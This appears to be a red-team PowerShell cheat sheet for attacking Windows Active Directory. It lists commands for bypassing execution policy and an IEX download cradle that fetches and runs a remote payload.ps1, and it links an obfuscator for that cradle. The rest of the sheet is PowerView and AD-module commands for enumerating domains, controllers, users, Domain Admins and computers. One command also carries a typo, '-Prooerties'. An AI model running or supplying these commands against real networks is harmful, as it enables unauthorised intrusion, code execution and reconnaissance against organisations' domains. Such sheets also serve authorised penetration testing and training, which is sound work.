## BASICS:  

**Check Execution Policy**:  
1. Get-ExecutionPolicy  

**Bypass execution policy**:  
1. powershell -executionpolicy bypass .\script.ps1  
2. powershell -ep bypass  
3. powershell -c <cmd>  
4. powershell -enc  
  
**Import Modules**:  
1. . .\script.ps1  
2. Import-Module <path to script>  

**List Available modules**:  
1. Get-Module -ListAvailable  

** All commands in the module**:  
1. Get-Command -Module <module name>  
  
## COMMAND EXECUTION:  
**IEX**:  (**!= OPSEC**)
1. iex (New-Object Net.webClient).DownloadString('http://server/payload.ps1')  

**IEX Obfuscator**: https://github.com/danielbohannon/Invoke-CradleCrafter.git  
  
## DOMAIN ENUMERATION (POWERVIEW):  
**Get the current domain**:  
1. Get-NetDomain  
2. Get-NetDomain -Domain \<domain name\>  

**Get the current domain SID**:  
1. Get-DomainSID  
  
**Get domain controllers for a domain**:  
1. Get-NetDomainController  
2. Get-NetDomainController -Domain \<domain name\>  

**Get users of domain**:  
1. Get-NetUser  
2. Get-NetUser -Domain \<domain name\>  
3. Get-NetUser -UserName \<user name\>  
  
**Get the groups in the current domain**:  
1. Get-NetGroup  
2. Get-NetGroup \*admin\*  

**Get all the members of the Domain Admins group**:  
1. Get-NetGroupMember -GroupName "Domain Admins"  
  
**Get group membership for a user**:  
1. Get-NetGroup -UserName \<user name\>  

**Get computers of the domain**:  
1. Get-NetComputer  
2. Get-NetComputer -FullData  


  
## DOMAIN ENUMERATION (ACTIVE DIRECTORY TOOLS):  
**Get the current domain**: 
1. Get-ADDomain  
2. Get-ADDomain -Identity \<domain name\>  
  
**Get the current domain SID**:  
1. (Get-ADDomain).DomainSID.Value  
  
**Get domain controllers for a domain**:  
1. Get-ADDomainController  
2. Get-ADDomainController -Discover -DomainName \<domain name\>  
  
**Get users of domain**:  
1. Get-ADUser -Filter \* -Properties \*  
2. Get-ADUser -Server \<domain controller\>  
3. Get-ADUser -Identity \<user name\>  

**Get the groups in the current domain**:  
1. Get-ADGroup -Filter * | select Name  
2. Get-ADGroup -Filter {Name like "\*admin\*"} | select Name  
  
**Get all the members of the Domain Admins group**:  
1. Get-ADGroupMember -Identity "Domain Admins" -Recursive  

**Get group membership for a user**:  
1. Get-ADPrincipalGroupMembership -Identity \<user name\>  
  
**Get computers of the domain**:  
1. Get-ADComputer -Filter * | select Name  
2. Get-ADComputer -Filter \* -Prooerties \*  
  
